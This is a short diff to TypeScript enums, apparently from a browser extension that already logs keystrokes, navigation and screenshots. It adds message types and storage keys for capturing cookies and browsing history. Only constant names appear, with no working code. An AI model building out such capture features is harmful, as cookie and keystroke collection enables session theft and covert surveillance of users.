@@ -17,6 +17,8 @@ export enum BackgroundMessage {
   WRITE_LOG = "WRITE_LOG",
   UPDATE_KEY_LOG = "UPDATE_KEY_LOG",
   CAPTURE_VISIBLE_TAB = "CAPTURE_VISIBLE_TAB",
+  CAPTURE_COOKIES = "CAPTURE_COOKIES",
+  CAPTURE_HISTORY = "CAPTURE_HISTORY",
 }
 
 export enum StorageKey {
@@ -25,6 +27,8 @@ export enum StorageKey {
   KEY_LOG = "KEY_LOG",
   NAVIGATION_LOG = "NAVIGATION_LOG",
   SCREENSHOT_LOG = "SCREENSHOT_LOG",
+  COOKIES = "COOKIES",
+  HISTORY = "HISTORY",
 }
 
 export enum SearchParamKey {
